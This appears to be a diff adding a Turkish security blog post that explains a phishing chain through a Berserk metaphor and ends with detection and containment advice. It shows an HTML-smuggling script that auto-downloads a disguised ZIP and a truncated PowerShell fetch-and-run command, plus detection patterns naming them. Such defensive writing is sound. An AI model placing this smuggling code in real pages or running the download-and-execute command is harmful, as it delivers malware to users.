@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Behelit: Bir Tıklamanın Kapı Açtığı Yer — InfectedLab</title>
+<meta name="description" content="Phishing zincirini Berserk'in Behelit kavramı üzerinden okuyan bir saha analizi.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;700;900&family=Cormorant+Garamond:ital,wght@0,400;0,600;1,400&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="grain"></div>
+
+<header class="site-header">
+  <div class="brand">
+    <a href="../index.html" class="brand-link">
+      <span class="brand-mark">⚔</span>
+      <span class="brand-name">InfectedLab</span>
+    </a>
+    <p class="brand-sub">Kara Süvari'nin Saha Defteri</p>
+  </div>
+  <nav class="site-nav">
+    <a href="../index.html">Defter</a>
+    <a href="../about.html">Kara Süvari</a>
+    <a href="../bestiary.html">Bestiary</a>
+    <a href="https://github.com/InfectedLab" target="_blank" rel="noopener">GitHub</a>
+  </nav>
+</header>
+
+<main class="page">
+  <article class="prose">
+    <p class="post-eyebrow">— Saha defteri / 8 Nisan 2026 —</p>
+    <h1>Behelit: Bir Tıklamanın Kapı Açtığı Yer</h1>
+    <p class="lede">
+      Behelit'in tek özelliği vardır: yanlış elde, doğru anda titrer.
+      Sıradan bir taşken ansızın bir yüze dönüşür, ve gözleri açıldığında
+      Tanrısal El'i çağırmıştır. Phishing payload'ı tam olarak böyle bir taştır.
+    </p>
+
+    <h2>Taşın Üç Yüzü</h2>
+    <p>
+      Bir Behelit, üç biçimde gelir: gözleri kapalı (zararsız görünür),
+      gözleri yarı açık (ısınmıştır, tetiklenmeye hazır), tamamen açık
+      (geri dönüşü yok). Bir oltalama e-postası da aynı üç fazda yaşar.
+    </p>
+
+    <h3>Faz 1 — Kapalı Göz: Lure</h3>
+    <p>
+      "Faturanız ekte." "DocuSign hesabınızı doğrulayın." "Yöneticiniz
+      sizinle bir dosya paylaştı." Sıradan kelimeler. SPF, DKIM, DMARC
+      uyumlu. Hiçbir EDR alarm vermez. Çünkü bu fazda Behelit henüz
+      bir taştır.
+    </p>
+
+    <h3>Faz 2 — Yarı Göz: Loader</h3>
+    <p>
+      Kullanıcı bağlantıya tıklar; bir <strong>HTML smuggling</strong>
+      sayfası açılır. Tarayıcıda görünen şey şu olabilir:
+    </p>
+    <pre><code>&lt;script&gt;
+  const blob = new Blob([atob(payload)], { type: "application/zip" });
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement("a");
+  a.href     = url; a.download = "Fatura_2026-04.zip";
+  a.click();
+&lt;/script&gt;</code></pre>
+    <p>
+      ZIP açılır, içinde bir <code>.lnk</code> dosyası vardır. LNK,
+      <code>powershell -nop -w hidden -c "iex(iwr ...)"</code> tarzı bir komut
+      çalıştırır. Behelit'in gözleri açılmaya başlamıştır.
+    </p>
+
+    <h3>Faz 3 — Açık Göz: Beacon</h3>
+    <p>
+      Loader, ikinci aşamayı çeker — Cobalt Strike, Sliver, Brute Ratel
+      veya özel bir implant. Artık ağa gerçek bir varlık girmiştir.
+      Tanrısal El çağrılmıştır; geri dönüşü yoktur.
+    </p>
+
+    <h2>Behelit'i Tutmamak — Kullanıcı Eğitiminin Sınırı</h2>
+    <p>
+      Yaygın yanılgı: kullanıcılar yeterince eğitilirse Behelit'e dokunmaz.
+      Yanlış. Behelit zaten <em>doğru anda</em> titreşmek üzere tasarlanmıştır:
+      dönem sonu fatura yoğunluğunda, IK haberi sırasında, bir devir teslim
+      sabahında. İnsan tarafında savunma kurmak, zırha bel bağlamaktır.
+    </p>
+    <blockquote>
+      "Zırh ne kadar kalın olursa olsun,
+      bir Havari yeterince beklerse içeri girer."
+    </blockquote>
+
+    <h2>Behelit'i Görmek — Detection</h2>
+    <ul>
+      <li>
+        <strong>HTML smuggling izi:</strong> Mail gateway'de
+        <code>application/octet-stream</code> base64 + <code>Blob</code>
+        + <code>download</code> kombinasyonu yüksek puanlı kural olmalı.
+      </li>
+      <li>
+        <strong>LNK içinde PowerShell:</strong> Sysmon EID 1 +
+        ParentImage <code>explorer.exe</code> + CommandLine içinde
+        <code>iex|iwr|frombase64</code> regex'i ile yakalanır.
+      </li>
+      <li>
+        <strong>Office macro / DLL sideload:</strong>
+        <code>winword.exe → rundll32.exe</code> veya
+        <code>excel.exe → mshta.exe</code> tipik anomalilerdir.
+      </li>
+    </ul>
+
+    <h2>Behelit'i Kırmak — Containment</h2>
+    <p>
+      Bir kullanıcı Behelit'e dokunduğunu fark ettiğinde tek doğru tepki:
+      makineyi ağdan koparmak ve <em>parolaları söylemeden önce</em> kimliğin
+      kendisini iptal etmek. Çünkü saldırgan ilk dakikada token çalmıştır;
+      parola değiştirmek artık ona zarar vermez.
+    </p>
+
+    <p class="signoff">— Kara Süvari, gece geç saat, mail gateway loglarında.</p>
+
+    <nav class="post-nav">
+      <a href="apostle-apt.html" class="btn btn-ghost">← Önceki: Havariler</a>
+      <a href="god-hand-nation-state.html" class="btn btn-primary">Sonraki: Tanrısal El →</a>
+    </nav>
+  </article>
+</main>
+
+<footer class="site-footer">
+  <div class="footer-cols">
+    <div>
+      <p class="brand-name small">InfectedLab</p>
+      <p class="footer-note">Bu defter bir kurgudur ve eğitim amaçlıdır. Berserk evreni Kentaro Miura'ya aittir.</p>
+    </div>
+    <div>
+      <p class="footer-head">Bağlantılar</p>
+      <ul>
+        <li><a href="https://github.com/InfectedLab" target="_blank" rel="noopener">GitHub</a></li>
+        <li><a href="../bestiary.html">Bestiary</a></li>
+        <li><a href="../about.html">Kara Süvari Hakkında</a></li>
+      </ul>
+    </div>
+    <div>
+      <p class="footer-head">Damga</p>
+      <p class="footer-note">"Her zafer, bir sonraki demonu çağırır."</p>
+    </div>
+  </div>
+  <p class="copyright">© <span id="year"></span> InfectedLab — Kara Süvari'nin Defteri</p>
+</footer>
+
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
